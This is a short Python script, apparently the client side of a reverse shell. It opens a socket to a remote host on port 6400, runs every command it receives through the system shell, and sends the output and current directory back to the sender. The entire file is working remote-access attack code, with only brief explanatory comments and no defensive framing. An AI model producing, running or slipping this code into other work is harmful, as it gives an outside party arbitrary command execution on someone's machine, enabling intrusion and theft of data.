import socket
import os
import subprocess

#Creating a socket and binding host & port
s = socket.socket()
host = ''
port = 6400
s.connect((host,port))

#While loop has been used to keep accepting commands from the server.
while True:
    data = s.recv(1024) #Recieves the data in 1024 buffer byte.
    if data[:2].decode('utf-8') == "cd": #Because, cd doesn't output anything.
        os.chdir(data[3:].decode('utf-8'))

#check if there is any input and execute in shell
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read() #Stores the output
        output_str = str(output_byte, 'utf-8') #Converting from bytes to string
        currentWD = os.getcwd() + "> " #Displays the Current Working Directory
        s.send(str.encode(output_str + currentWD)) #sends the output over the network.

        print(output_str)
